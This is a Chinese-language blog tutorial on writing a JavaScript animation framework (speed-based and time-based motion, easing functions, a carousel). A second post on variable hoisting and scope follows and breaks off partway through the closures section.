运动框架的实现思路 运动，其实就是在一段时间内改变 left 、 right 、 width 、 height 、 opactiy 的值，到达目的地之后停止 位移 top,left 折叠 width,height 淡入淡出 opacity 时间有关系 setInterval setTimeout 用javascript直接获取行间样式很容易，但如果要获取非行间样式那我们只能借助函数了。我这里编写了一个名为getStyle的函数，专门处理取非行间的样式 123function getStyle(obj,attr)&#123; return getComputedStyle(obj)[attr]?getComputedStyle(obj)[attr]:obj.currentStyle[attr];&#125; 1.2 一些案例演示 1.2.1 运动之速 1&lt;div id=\"box\"&gt;&lt;/div&gt; 1234567#box &#123; width: 100px; height: 100px; background: red; position: relative; left: 0;&#125; 123456789101112131415161718192021222324252627var box = document.getElementById(\"box\");var speed = 0; //步长var target = 600;var timer = null;timer = setInterval(function()&#123; var curr = parseInt(getStyle(box,\"left\")); //去除getStyle(box,\"left\")的单位 if(curr == target)&#123; clearInterval(timer); speed = 0; alert(\"运动结束\"); &#125;else&#123; speed +=10; box.style.left = speed + \"px\"; &#125; &#125;,1000/30);//监控left的值的变化 怎么样拿到left的值//alert(getComputedStyle(box)[\"width\"]);//alert(box.currentStyle[\"left\"]);// currentStyle --IE // getComputedStyle -- 非IEfunction getStyle(obj,attr)&#123; return getComputedStyle(obj)[attr]?getComputedStyle(obj)[attr]:obj.currentStyle[attr];&#125; 在线演示 1.2.2 运动速度之封装1 1&lt;div id=\"ball\"&gt;&lt;/div&gt; 12345#ball &#123; width: 100px; height: 100px; background: blue;&#125; 1234567891011121314151617181920212223242526272829303132333435var ball = document.getElementById(\"ball\");ball.onmouseover = function()&#123; //同时变换 用的最多 //move(this,\"width\",500,10); //move(this,\"height\",500,10); move(ball,&#123;\"width\":400,\"height\":300&#125;,10);&#125;ball.onmouseout = function()&#123; //move(this,\"width\",100,-10); //move(this,\"height\",100,-10); move(ball,&#123;\"width\":100,\"height\":100&#125;,-10);&#125;function move(obj,json,speed)&#123; clearInterval(obj.timer); var mark = true; obj.timer = setInterval(function()&#123; for(var attr in json)&#123; var curr = parseInt(getStyle(obj,attr)); var target = json[attr]; if(curr != target)&#123; obj.style[attr] = curr+speed+\"px\"; mark = false; &#125; &#125; if(mark)&#123; clearInterval(obj.timer); &#125; &#125;,1000/30);&#125;function getStyle(obj,attr)&#123; return getComputedStyle(obj)[attr]?getComputedStyle(obj)[attr]:obj.currentStyle[attr];&#125; 需要注意的地方 当需要两个动画的时候，会执行后面一个，解决办法如下，回调函数 当需要两个以上的时候，需要考虑是否可写一行代码变换多个属性 变换不一致的时候，定时器被提前清除 在线演示 1.2.3 运动速度之封装2–增加opacity1&lt;div id=\"ball\"&gt;&lt;/div&gt; 123456789#ball &#123; position: relative; left: 0; top: 0; width: 100px; height: 100px; background: blue; opacity: 1;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243var ball = document.getElementById(\"ball\");ball.onmouseover = function()&#123; move(ball,&#123;\"width\":300,\"height\":300,\"opacity\":0.3&#125;);&#125;// ball.onmouseout = function()&#123;// move(ball,&#123;\"width\":100,\"height\":100&#125;,-10);// &#125;function move(obj,json)&#123; clearInterval(obj.timer); var mark = true; obj.timer = setInterval(function()&#123; for(var attr in json)&#123; var curr = null; var target = json[attr]; var speed = null; if(attr == \"opacity\")&#123; curr = getStyle(obj,attr)*100; speed = (target*100-curr)*0.15; &#125;else &#123; curr = parseInt(getStyle(obj,attr)); speed = (target - curr)*0.15; &#125; speed = speed&gt;0 ? Math.ceil(speed):Math.floor(speed); if(curr != target)&#123; if(attr == \"opacity\")&#123; obj.style[attr] = (curr+speed)/100; &#125;else &#123; obj.style[attr] = curr+speed+\"px\"; &#125; mark = false; &#125; &#125; if(mark)&#123; clearInterval(obj.timer); &#125; &#125;,1000/30);&#125;function getStyle(obj,attr)&#123; return getComputedStyle(obj)[attr]?getComputedStyle(obj)[attr]:obj.currentStyle[attr];&#125; 在线演示 需要注意的地方 当需要两个动画的时候，会执行后面一个，解决办法如下，回调函数 当需要两个以上的时候，需要考虑是否可写一行代码变换多个属性 变换不一致的时候，定时器被提前清除 速度speed不要写死 1.3 运动框架之应用1.3.1 分享按钮1234&lt;div id=\"ball\"&gt;&lt;/div&gt;&lt;div id=\"box1\"&gt; &lt;div id=\"box2\"&gt;分享到&lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var box1 = document.getElementById(\"box1\");var ball = document.getElementById(\"ball\");box1.onmouseover = function()&#123; move(this,\"left\",0,10);&#125;box1.onmouseout = function()&#123; move(this,\"left\",-100,-10);&#125;//问题一：当需要两个动画的时候，会执行后面一个，解决办法如下，回调函数ball.onmouseover = function()&#123; //同时变换 用的最多 //move(this,\"width\",500,10); //move(this,\"height\",500,10); //列队在执行 move(ball,\"width\",500,10,function()&#123; move(ball,\"height\",500,10); &#125;);&#125;ball.onmouseout = function()&#123; //move(this,\"width\",100,-10); //move(this,\"height\",100,-10); move(ball,\"width\",100,-10,function()&#123; move(ball,\"height\",100,-10); &#125;);&#125;var timer = null;function move(obj,attr,target,speed,callback)&#123; clearInterval(timer); //obj.timer缓存到各自的obj下 timer = setInterval(function()&#123; var curr = parseInt(getStyle(obj,attr)); if(curr == target)&#123; clearInterval(timer); callback &amp;&amp; callback(); &#125;else &#123; obj.style[attr] = curr+speed+\"px\"; &#125; &#125;,1000/30);&#125;function getStyle(obj,attr)&#123; return getComputedStyle(obj)[attr]?getComputedStyle(obj)[attr]:obj.currentStyle[attr];&#125; 在线演示 1.3.2运动框架之轮播图应用 焦点轮播–基本版本–在线演示 焦点轮播–淡入淡出–在线演示 焦点轮播–左右–在线演示 焦点轮播–上下–在线演示 1.3.2.1 焦点轮播–左右-无缝-速度版实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;div id=\"box\"&gt; &lt;ul id=\"imgBox\"&gt; &lt;li&gt;![](http://upload-images.jianshu.io/upload_images/1480597-c72819402fb928e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)&lt;/li&gt; &lt;li&gt;![](http://upload-images.jianshu.io/upload_images/1480597-6830ca74fe1e6fcd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)&lt;/li&gt; &lt;li&gt;![](http://upload-images.jianshu.io/upload_images/1480597-5d38376e63ffd0b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)&lt;/li&gt; &lt;li&gt;![](http://upload-images.jianshu.io/upload_images/1480597-2aa932ffbba4091e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)&lt;/li&gt; &lt;li&gt;![](http://upload-images.jianshu.io/upload_images/1480597-c72819402fb928e8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)&lt;/li&gt; &lt;/ul&gt; &lt;ol id=\"btn\"&gt; &lt;li class=\"active\"&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;/ol&gt;&lt;/div&gt;&lt;script src=\"http://7xq6al.com1.z0.glb.clouddn.com/Animate.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; var box = document.querySelector(\"#box\"); var imgUl = document.querySelector(\"#imgBox\"); var btns = document.querySelector(\"#btn\").querySelectorAll(\"li\"); var len = btns.length; var lenImg = imgUl.querySelectorAll(\"li\").length; var index = 0; //控制img的索引 var cindex = 0;//控制按钮的索引 var timer = null; for (var i=0;i&lt;len;i++) &#123; (function(index)&#123; btns[index].onmouseover = function()&#123; for (var j=0;j&lt;len;j++)&#123; btns[j].className = \"\"; &#125; cindex = index;//保持索引同步 animateSpeed(imgUl,&#123;\"left\":-970*index&#125;); this.className = \"active\"; &#125; &#125;)(i); &#125; function autoPlay()&#123; index++; cindex++; cindex %=len;//限制长度 for (var j=0;j&lt;len;j++)&#123; btns[j].className = \"\"; &#125; animateSpeed(imgUl,&#123;\"left\":-970*index&#125;,function()&#123; if(index == lenImg-1)&#123; this.style.left = 0; index = 0; &#125; &#125;); btns[cindex].className = \"active\"; &#125; timer = setInterval(autoPlay,2000); box.onmouseover = function()&#123; clearInterval(timer); &#125; box.onmouseout = function()&#123; timer = setInterval(autoPlay,2000); &#125;&lt;/script&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354*&#123; padding: 0; margin: 0;&#125;body&#123; font-size: 14px; font-family: \"微软雅黑\";&#125;ul,li&#123; list-style: none;&#125;#box &#123; position: relative; width: 970px; height: 350px; margin: 30px auto; overflow: hidden;&#125;#imgBox &#123; width:1000%;/*自动计算百分比*/ position: absolute; left: 0;&#125;#imgBox li&#123; width: 970px; height: 350px; float: left;&#125;#imgBox li img &#123; width: 970px; height: 350px;&#125;#btn &#123; width: 120px; position: absolute; right: 10px; bottom: 10px;&#125;#btn li &#123; width: 20px; height: 20px; line-height: 20px; border-radius: 50%; text-align: center; cursor: pointer; background: #fff; margin: 0 2px; float: left;&#125;#btn li.active &#123; background: #F17A5C; color: #fff;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647//速度版本(function(win)&#123; function move(obj,json,callback)&#123; clearInterval(obj.timer); obj.timer = setInterval(function()&#123; var mark = true; for(var attr in json)&#123; var cur = null; if(attr == \"opacity\")&#123; cur = getStyle(obj,attr)*100; &#125;else&#123; //如果没写 默认填充成0 cur = parseInt(getStyle(obj,attr))||0; &#125; var target = json[attr]; var speed = (target - cur)*0.2; speed = speed&gt;0?Math.ceil(speed):Math.floor(speed); if(cur != target)&#123; if(attr == \"opacity\")&#123; //IE opacity兼容问题 obj.style.filter = \"alpha(opacity=\"+(cur+speed)+\")\"; obj.style[attr] = (cur + speed)/100; &#125;else&#123; obj.style[attr] = cur + speed + \"px\"; &#125; mark = false; &#125;; &#125; if(mark)&#123; clearInterval(obj.timer); callback &amp;&amp; callback.call(obj); &#125; &#125;,1000/30); &#125; win.animateSpeed = move;&#125;)(window); function getStyle(obj,attr)&#123; return getComputedStyle(obj)[attr]?getComputedStyle(obj)[attr]:obj.currentStyle[attr];&#125;function getId(id)&#123; return document.getElementById(id);&#125; 二、JavaScript运动框架之时间版 2.1 关于运动 速度的运动 通过速度来控制元素的 位移 / 折叠 / 淡入淡出 时间的运动 通过时间来控制元素的 位移 / 折叠 / 淡入淡出(jQuery) 时间的运动 基于一些数学公式 匀速运动 在路程的每一个点 速度都一样 2.2 一些案例演示 运动框架之时间版本-1 运动框架之时间版本-2 运动框架之时间版本-3 运动框架之时间版本-4 2.3 运动框架之时间版本-借助animate一些函数实现–综合完整版 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;div id=\"box2\"&gt;&lt;/div&gt;&lt;div id=\"box3\"&gt;&lt;/div&gt;&lt;div id=\"box4\"&gt;&lt;/div&gt;&lt;div id=\"box5\"&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; //时间版本 getId(\"box2\").onclick = function()&#123; animateTime(getId(\"box2\"),&#123; \"left\":500, \"opacity\":100 &#125;,1000,\"elasticOut\",function()&#123; this.innerHTML = \"我是时间版本\"; &#125;); &#125;getId(\"box3\").onclick = function()&#123; animateTime(getId(\"box3\"),&#123; \"left\":500, \"opacity\":100 &#125;,1000,\"backIn\",function()&#123; this.innerHTML = \"我是时间版本\"; &#125;); &#125;getId(\"box4\").onclick = function()&#123; animateTime(getId(\"box4\"),&#123; \"left\":500, \"opacity\":100 &#125;,1000,\"bounceIn\",function()&#123; this.innerHTML = \"我是时间版本\"; &#125;); &#125;getId(\"box5\").onclick = function()&#123; animateTime(getId(\"box5\"),&#123; \"left\":500, \"opacity\":100 &#125;,1000,\"bounceBoth\",function()&#123; this.innerHTML = \"我是时间版本\"; &#125;); &#125; &lt;/script&gt; 1234567891011121314#box1,#box2,#box3,#box4,#box5 &#123; position: relative; width: 100px; height: 100px; line-height: 100px; text-align: center; background: red; color: #fff; font-size: 12px; opacity: 0.5; filter:alpha(opcity=20);/**兼容IE*/ margin: 10px; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200/*t b c dt current time :nTime-sTimeb begining time :currc chang in value :变化量end-currd duration :持续时间 time *//*** * @param &#123;Object&#125; obj 元素对象* @param &#123;Object&#125; json 多个属性* @param &#123;Object&#125; time 变化时间* @param &#123;Object&#125; prop 运动函数* @param &#123;Object&#125; callback 回调函数*///时间版本(function(win)&#123; function move(obj,json,time,prop,callback)&#123;//一般定时器结束后最好清除clearInterval(obj.timer);var curr = &#123;&#125;;var end = &#123;&#125;;//通过for in 在上车前把所有东西装到包里for(var attr in json)&#123; if(attr == \"opacity\")&#123;//opacity特殊东西特殊对待 curr[attr] = getStyle(obj,attr)*100;//化为整数好计算 &#125;else&#123; curr[attr] = parseInt(getStyle(obj,attr))||0; &#125; end[attr] = json[attr]; &#125;//如果没写默认值 默认就是0 不然在IE出问题//var curr = parseInt(getStyle(obj,attr))||0;//var end = target;var sTime = new Date();//开始时间T0//开始变换了obj.timer = setInterval(function()&#123; var nTime = new Date();//当前时间Tt var t = nTime -sTime; var d = time; //St = (Tt-T0)/Time*(S-S0)+S0 //(nTime-sTime)/time 比例最多为1 /*var prop = (nTime-sTime)/time; */ if(t &gt;=d)&#123; t = d; clearInterval(obj.timer); callback &amp;&amp; callback.call(obj); &#125; for(var attr in json)&#123; var b = curr[attr]; var c = end[attr] - b; if(attr == \"opacity\")&#123; //var s = prop*(end[attr]-curr[attr])+curr[attr]; var s = Tween[prop](t,b,c,d); obj.style[attr] = s/100; obj.style.filter = \"alpha(opacity=\"+s+\")\"; &#125;else&#123; //var s = prop*(end[attr]-curr[attr])+curr[attr]; var s = Tween[prop](t,b,c,d); obj.style[attr] = s+\"px\"; &#125; &#125; &#125;,13);var Tween = &#123; linear: function (t, b, c, d)&#123; //匀速 return c*t/d + b; // t/d = prop; &#125;, easeIn: function(t, b, c, d)&#123; //加速曲线 return c*(t/=d)*t + b; &#125;, easeOut: function(t, b, c, d)&#123; //减速曲线 return -c *(t/=d)*(t-2) + b; &#125;, easeBoth: function(t, b, c, d)&#123; //加速减速曲线 if ((t/=d/2) &lt; 1) &#123; return c/2*t*t + b; &#125; return -c/2 * ((--t)*(t-2) - 1) + b; &#125;, easeInStrong: function(t, b, c, d)&#123; //加加速曲线 return c*(t/=d)*t*t*t + b; &#125;, easeOutStrong: function(t, b, c, d)&#123; //减减速曲线 return -c * ((t=t/d-1)*t*t*t - 1) + b; &#125;, easeBothStrong: function(t, b, c, d)&#123; //加加速减减速曲线 if ((t/=d/2) &lt; 1) &#123; return c/2*t*t*t*t + b; &#125; return -c/2 * ((t-=2)*t*t*t - 2) + b; &#125;, elasticIn: function(t, b, c, d, a, p)&#123; //正弦衰减曲线（弹动渐入） if (t === 0) &#123; return b; &#125; if ( (t /= d) == 1 ) &#123; return b+c; &#125; if (!p) &#123; p=d*0.3; &#125; if (!a || a &lt; Math.abs(c)) &#123; a = c; var s = p/4; &#125; else &#123; var s = p/(2*Math.PI) * Math.asin (c/a); &#125; return -(a*Math.pow(2,10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )) + b; &#125;, elasticOut: function(t, b, c, d, a, p)&#123; //正弦增强曲线（弹动渐出） if (t === 0) &#123; return b; &#125; if ( (t /= d) == 1 ) &#123; return b+c; &#125; if (!p) &#123; p=d*0.3; &#125; if (!a || a &lt; Math.abs(c)) &#123; a = c; var s = p / 4; &#125; else &#123; var s = p/(2*Math.PI) * Math.asin (c/a); &#125; return a*Math.pow(2,-10*t) * Math.sin( (t*d-s)*(2*Math.PI)/p ) + c + b; &#125;, elasticBoth: function(t, b, c, d, a, p)&#123; if (t === 0) &#123; return b; &#125; if ( (t /= d/2) == 2 ) &#123; return b+c; &#125; if (!p) &#123; p = d*(0.3*1.5); &#125; if ( !a || a &lt; Math.abs(c) ) &#123; a = c; var s = p/4; &#125; else &#123; var s = p/(2*Math.PI) * Math.asin (c/a); &#125; if (t &lt; 1) &#123; return - 0.5*(a*Math.pow(2,10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )) + b; &#125; return a*Math.pow(2,-10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )*0.5 + c + b; &#125;, backIn: function(t, b, c, d, s)&#123; //回退加速（回退渐入） if (typeof s == 'undefined') &#123; s = 1.70158; &#125; return c*(t/=d)*t*((s+1)*t - s) + b; &#125;, backOut: function(t, b, c, d, s)&#123; if (typeof s == 'undefined') &#123; s = 3.70158; //回缩的距离 &#125; return c*((t=t/d-1)*t*((s+1)*t + s) + 1) + b; &#125;, backBoth: function(t, b, c, d, s)&#123; if (typeof s == 'undefined') &#123; s = 1.70158; &#125; if ((t /= d/2 ) &lt; 1) &#123; return c/2*(t*t*(((s*=(1.525))+1)*t - s)) + b; &#125; return c/2*((t-=2)*t*(((s*=(1.525))+1)*t + s) + 2) + b; &#125;, bounceIn: function(t, b, c, d)&#123; //弹球减振（弹球渐出） return c - Tween['bounceOut'](d-t, 0, c, d) + b; &#125;, bounceOut: function(t, b, c, d)&#123; if ((t/=d) &lt; (1/2.75)) &#123; return c*(7.5625*t*t) + b; &#125; else if (t &lt; (2/2.75)) &#123; return c*(7.5625*(t-=(1.5/2.75))*t + 0.75) + b; &#125; else if (t &lt; (2.5/2.75)) &#123; return c*(7.5625*(t-=(2.25/2.75))*t + 0.9375) + b; &#125; return c*(7.5625*(t-=(2.625/2.75))*t + 0.984375) + b; &#125;, bounceBoth: function(t, b, c, d)&#123; if (t &lt; d/2) &#123; return Tween['bounceIn'](t*2, 0, c, d) * 0.5 + b; &#125; return Tween['bounceOut'](t*2-d, 0, c, d) * 0.5 + c*0.5 + b; &#125;&#125;;&#125;win.animateTime = move; &#125;)(window); 在线演示 三、运动框架之时间速度版完整封装123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247/*t b c dt current time :nTime-sTimeb begining time :currc chang in value :变化量end-currd duration :持续时间 time *//** * * @param &#123;Object&#125; obj 元素对象 * @param &#123;Object&#125; json 多个属性 * @param &#123;Object&#125; time 变化时间 * @param &#123;Object&#125; prop 运动函数 * @param &#123;Object&#125; callback 回调函数 *///时间版本(function(win)&#123; function move(obj,json,time,prop,callback)&#123; //一般定时器结束后最好清除 clearInterval(obj.timer); var curr = &#123;&#125;; var end = &#123;&#125;; //通过for in 在上车前把所有东西装到包里 for(var attr in json)&#123; if(attr == \"opacity\")&#123;//opacity特殊东西特殊对待 curr[attr] = getStyle(obj,attr)*100;//化为整数好计算 &#125;else&#123; curr[attr] = parseInt(getStyle(obj,attr))||0; &#125; end[attr] = json[attr]; &#125; //如果没写默认值 默认就是0 不然在IE出问题 //var curr = parseInt(getStyle(obj,attr))||0; //var end = target; var sTime = new Date();//开始时间T0 //开始变换了 obj.timer = setInterval(function()&#123; var nTime = new Date();//当前时间Tt var t = nTime -sTime; var d = time; //St = (Tt-T0)/Time*(S-S0)+S0 //(nTime-sTime)/time 比例最多为1 /*var prop = (nTime-sTime)/time; */ if(t &gt;=d)&#123; t = d; clearInterval(obj.timer); callback &amp;&amp; callback.call(obj); &#125; for(var attr in json)&#123; var b = curr[attr]; var c = end[attr] - b; if(attr == \"opacity\")&#123; //var s = prop*(end[attr]-curr[attr])+curr[attr]; var s = Tween[prop](t,b,c,d); obj.style[attr] = s/100; obj.style.filter = \"alpha(opacity=\"+s+\")\"; &#125;else&#123; //var s = prop*(end[attr]-curr[attr])+curr[attr]; var s = Tween[prop](t,b,c,d); obj.style[attr] = s+\"px\"; &#125; &#125; &#125;,13); var Tween = &#123; linear: function (t, b, c, d)&#123; //匀速 return c*t/d + b; // t/d = prop; &#125;, easeIn: function(t, b, c, d)&#123; //加速曲线 return c*(t/=d)*t + b; &#125;, easeOut: function(t, b, c, d)&#123; //减速曲线 return -c *(t/=d)*(t-2) + b; &#125;, easeBoth: function(t, b, c, d)&#123; //加速减速曲线 if ((t/=d/2) &lt; 1) &#123; return c/2*t*t + b; &#125; return -c/2 * ((--t)*(t-2) - 1) + b; &#125;, easeInStrong: function(t, b, c, d)&#123; //加加速曲线 return c*(t/=d)*t*t*t + b; &#125;, easeOutStrong: function(t, b, c, d)&#123; //减减速曲线 return -c * ((t=t/d-1)*t*t*t - 1) + b; &#125;, easeBothStrong: function(t, b, c, d)&#123; //加加速减减速曲线 if ((t/=d/2) &lt; 1) &#123; return c/2*t*t*t*t + b; &#125; return -c/2 * ((t-=2)*t*t*t - 2) + b; &#125;, elasticIn: function(t, b, c, d, a, p)&#123; //正弦衰减曲线（弹动渐入） if (t === 0) &#123; return b; &#125; if ( (t /= d) == 1 ) &#123; return b+c; &#125; if (!p) &#123; p=d*0.3; &#125; if (!a || a &lt; Math.abs(c)) &#123; a = c; var s = p/4; &#125; else &#123; var s = p/(2*Math.PI) * Math.asin (c/a); &#125; return -(a*Math.pow(2,10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )) + b; &#125;, elasticOut: function(t, b, c, d, a, p)&#123; //正弦增强曲线（弹动渐出） if (t === 0) &#123; return b; &#125; if ( (t /= d) == 1 ) &#123; return b+c; &#125; if (!p) &#123; p=d*0.3; &#125; if (!a || a &lt; Math.abs(c)) &#123; a = c; var s = p / 4; &#125; else &#123; var s = p/(2*Math.PI) * Math.asin (c/a); &#125; return a*Math.pow(2,-10*t) * Math.sin( (t*d-s)*(2*Math.PI)/p ) + c + b; &#125;, elasticBoth: function(t, b, c, d, a, p)&#123; if (t === 0) &#123; return b; &#125; if ( (t /= d/2) == 2 ) &#123; return b+c; &#125; if (!p) &#123; p = d*(0.3*1.5); &#125; if ( !a || a &lt; Math.abs(c) ) &#123; a = c; var s = p/4; &#125; else &#123; var s = p/(2*Math.PI) * Math.asin (c/a); &#125; if (t &lt; 1) &#123; return - 0.5*(a*Math.pow(2,10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )) + b; &#125; return a*Math.pow(2,-10*(t-=1)) * Math.sin( (t*d-s)*(2*Math.PI)/p )*0.5 + c + b; &#125;, backIn: function(t, b, c, d, s)&#123; //回退加速（回退渐入） if (typeof s == 'undefined') &#123; s = 1.70158; &#125; return c*(t/=d)*t*((s+1)*t - s) + b; &#125;, backOut: function(t, b, c, d, s)&#123; if (typeof s == 'undefined') &#123; s = 3.70158; //回缩的距离 &#125; return c*((t=t/d-1)*t*((s+1)*t + s) + 1) + b; &#125;, backBoth: function(t, b, c, d, s)&#123; if (typeof s == 'undefined') &#123; s = 1.70158; &#125; if ((t /= d/2 ) &lt; 1) &#123; return c/2*(t*t*(((s*=(1.525))+1)*t - s)) + b; &#125; return c/2*((t-=2)*t*(((s*=(1.525))+1)*t + s) + 2) + b; &#125;, bounceIn: function(t, b, c, d)&#123; //弹球减振（弹球渐出） return c - Tween['bounceOut'](d-t, 0, c, d) + b; &#125;, bounceOut: function(t, b, c, d)&#123; if ((t/=d) &lt; (1/2.75)) &#123; return c*(7.5625*t*t) + b; &#125; else if (t &lt; (2/2.75)) &#123; return c*(7.5625*(t-=(1.5/2.75))*t + 0.75) + b; &#125; else if (t &lt; (2.5/2.75)) &#123; return c*(7.5625*(t-=(2.25/2.75))*t + 0.9375) + b; &#125; return c*(7.5625*(t-=(2.625/2.75))*t + 0.984375) + b; &#125;, bounceBoth: function(t, b, c, d)&#123; if (t &lt; d/2) &#123; return Tween['bounceIn'](t*2, 0, c, d) * 0.5 + b; &#125; return Tween['bounceOut'](t*2-d, 0, c, d) * 0.5 + c*0.5 + b; &#125; &#125;; &#125; win.animateTime = move; &#125;)(window);//速度版本(function(win)&#123; function move(obj,json,callback)&#123; clearInterval(obj.timer); obj.timer = setInterval(function()&#123; var mark = true; for(var attr in json)&#123; var cur = null; if(attr == \"opacity\")&#123; cur = getStyle(obj,attr)*100; &#125;else&#123; //如果没写 默认填充成0 cur = parseInt(getStyle(obj,attr))||0; &#125; var target = json[attr]; var speed = (target - cur)*0.2; speed = speed&gt;0?Math.ceil(speed):Math.floor(speed); if(cur != target)&#123; if(attr == \"opacity\")&#123; //IE opacity兼容问题 obj.style.filter = \"alpha(opacity=\"+(cur+speed)+\")\"; obj.style[attr] = (cur + speed)/100; &#125;else&#123; obj.style[attr] = cur + speed + \"px\"; &#125; mark = false; &#125;; &#125; if(mark)&#123; clearInterval(obj.timer); callback &amp;&amp; callback.call(obj); &#125; &#125;,1000/30); &#125; win.animateSpeed = move;&#125;)(window); function getStyle(obj,attr)&#123; return getComputedStyle(obj)[attr]?getComputedStyle(obj)[attr]:obj.currentStyle[attr];&#125;function getId(id)&#123; return document.getElementById(id);&#125; 更多使用记录，详情 https://github.com/poetries/Animate","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"运动框架","slug":"运动框架","permalink":"https://ru23.com/tags/运动框架/"}]},{"title":"JavaScript作用域分析总结","slug":"2017-01-js-scope","date":"2017-01-10T04:50:43.000Z","updated":"2018-10-24T03:46:02.061Z","comments":true,"path":"note/c4e8b3f5.html","link":"","permalink":"https://ru23.com/note/c4e8b3f5.html","excerpt":"原文链接 http://blog.poetries.top/2017/01/10/js-scope 一、JS解析顺序和作用域： 解析顺序： 定义（先找var function） 执行 ( 在逐步执行 ) 注意:如果函数名和var定义的变量相同，var会被函数覆盖 作用域： 每个script是一个作用域 每个函数{}是一个作用域 程序每执行到一个作用域，都是按照解析顺序解析代码； 作用域链:从内往外找要找函数内的变量；","text":"原文链接 http://blog.poetries.top/2017/01/10/js-scope 一、JS解析顺序和作用域： 解析顺序： 定义（先找var function） 执行 ( 在逐步执行 ) 注意:如果函数名和var定义的变量相同，var会被函数覆盖 作用域： 每个script是一个作用域 每个函数{}是一个作用域 程序每执行到一个作用域，都是按照解析顺序解析代码； 作用域链:从内往外找要找函数内的变量； 二、案例分析 分析前请记住这段话 解析顺序： 定义（先找var function） 执行 ( 在逐步执行 ) 注意:如果函数名和var定义的变量相同，var会被函数覆盖 举例1 12345678910alert( a );var a = 10;alert( a );function a()&#123;alert(20)&#125;;alert( a );var a = 30;alert( a );function a()&#123;alert(40)&#125;;alert( a );// 函数块 10 10 30 30 分析 1:找定义 function a(){alert(40)}; 2:执行 alert( a ) //函数块a = 10; alert( a ); // 10 alert( a ); // 10 a = 30; alert( a ); // 30 alert( a ); // 30 举例2 12345678a();var a = function()&#123;alert( 1 );&#125;a();function a()&#123;alert(2);&#125;a();var a = function()&#123;alert(3);&#125;a();//2 1 1 3 分析 1:找定义function a(){alert(2);} 2:执行a(); //2 a = function(){alert( 1 );} a(); //1 a(); //1 a = function b(){alert(3);}; a();//3 举例3 12345678 var a = 0; function fn()&#123; alert( a ); var a = 1; alert( a ); &#125; alert(a);fn(); 分析 1:找定义var a function fn(){} 2:执行a = 0; fn(); ===&gt; 1:找定义 2:执行 alert(a); //undefined a = 1; alert(a); //1 举例4 12345678910fn()();var a = 0;function fn()&#123; alert( a ); var a = 3; function c()&#123; alert( a ); &#125; return c;&#125;; 分析 1:找定义var a function fn 2:执行fn() ===&gt; 1:找定义 function c 2:执行 alert(a); //undefined a = 3 return function c fn()() ==&gt;1:找定义 function c 2:alert(a);//undefined 3 a = 0; 举例5 1234567891011121314var a = 5;function fn()&#123; var a = 10; alert(a); function b()&#123; a++; alert(a); &#125;; return b;&#125;;var c = fn();c();fn()();c(); 分析 1:找定义 var afunction fn var c 2:执行 a = 5;c = fn(); === &gt; 1:找定义 var a function b 2:执行 a = 10; alert(a); //10 return function b(){}; c();=========&gt; 1:找定义 2:执行 a++; //11 alert(a);//11 fn()(); //10 11 c() ========&gt; 1:找定义 2:执行 a++;//11+1; alert(a); //12 举例6 12345678910111213//alert(x);//9:执行弹出x,结果x没定义,错误.alert(i);//9:执行弹出i,然而i之前已经定义,只不过没地址,因此是undefiendvar i = 10;//1:var i; 10:把常量池中10的地址赋给栈中的ivar j = \"你好\";//2:var j; 11:把常量池中 你好 的地址复给栈中的jvar k = z = null;//3:var k,z; 12:把堆中null的地址赋值给z和kvar m = function()&#123;//4:var m; 5:function匿名函数 13:把匿名函数在堆中的地址赋给栈中的m alert(2);&#125;var b = document.body;//6:var b; 14:把堆中document.body对象的地址赋给栈中的bvar f = true;//7:var f; 15:把常量池中true的地址赋给栈中的变量ffunction m()&#123;//8:function m; alert(1);&#125; 举例7 12345678910function m()&#123; c = 50;//在局部变量中找不到定义的c 沿着作用域链找到了全局变量的c alert('哈哈哈'); //var c;&#125;var c = 150; // 函数m()还未执行到 还没被销毁 此时全局c的值c=50m();var c = 20;//到这里一步 m()已经执行完了 函数已经销毁了 这里的c还是20alert(c);//20 举例8 1234567891011121314function m()&#123; c = 50;//在局部变量中找不到定义的c 沿着作用域链找到了全局变量的c alert('哈哈哈'); function inner()&#123; c = 30; alert('嘻嘻'); &#125; inner();//c在函数内部找不到定义 所以沿着作用域链找到了全局的c&#125;var c = 20;//到这里一步 m()还没执行 函数没被销毁 这里的c是30m();alert(c);//30 三、闭包 3.1 概念 其实是函数嵌套函数 每个函数都是一个独立的作用域 每个都有自己的生命周期 延长局部变量的生命周期 3.2 例子 123456 &lt;ul 